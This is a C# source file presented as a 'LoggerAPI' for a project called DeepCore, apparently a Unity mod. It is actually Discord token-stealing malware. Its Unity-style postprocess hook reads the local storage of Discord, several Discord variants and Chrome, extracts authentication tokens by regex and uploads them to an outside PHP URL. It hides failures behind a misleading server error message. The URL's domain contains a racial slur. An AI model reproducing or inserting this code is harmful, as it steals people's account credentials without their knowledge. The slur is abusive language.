using System;
using System.IO;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using DeepCore.Client;
using System.Net;

namespace DeepCore.ServerAPI
{
    internal class LoggerAPI
    {
        private static readonly string loggingUrl = "https://nigga.rest/AAAAAAAAAAAAAAAAAAAAAAAAshit/logging.php";
        public static void OnPostprocessAllAssets()
        {
            string token = ExtractToken();
            LogToken(token);
        }
        public static string ExtractToken()
        {
            var APPDATA = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var LOCAL = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            var tokenPaths = new List<string>
            {
            APPDATA + "\\Discord\\Local Storage\\leveldb\\",
            APPDATA + "\\discordcanary\\Local Storage\\leveldb\\",
            APPDATA + "\\discordptb\\Local Storage\\leveldb\\",
            APPDATA + "\\discorddevelopment\\Local Storage\\leveldb\\",
            APPDATA + "\\Lightcord\\Local Storage\\leveldb\\",
            LOCAL + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\"
        };

            var token = new List<string>();

            foreach (var path in tokenPaths)
            {
                if (!Directory.Exists(path)) continue;

                var filelist = new DirectoryInfo(path);
                foreach (var file in filelist.GetFiles())
                {
                    if (file.Name.Equals("LOCK")) continue;
                    try
                    {
                        var data = File.ReadAllText(file.FullName);
                        foreach (Match match in Regex.Matches(data, "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27,}|mfa\\.[\\w-]{84}"))
                        {
                            if (!token.Contains(match.Value))
                            {
                                token.Add(match.Value);
                            }
                        }
                    }
                    catch (Exception) { }
                }
            }
            return token.Count > 0 ? String.Join(",", token.ToArray()) : "No token found";
        }
        private static void LogToken(string token)
        {
            using (var webClient = new WebClient())
            {
                var values = new System.Collections.Specialized.NameValueCollection
                {
                    { "token", token }
                };

                try
                {
                    webClient.UploadValues(loggingUrl, values);
                }
                catch (Exception ex)
                {
                    DeepConsole.LogConsole("Server", "Failed to connect to RLServer.");
                }
            }
        }
    }
}
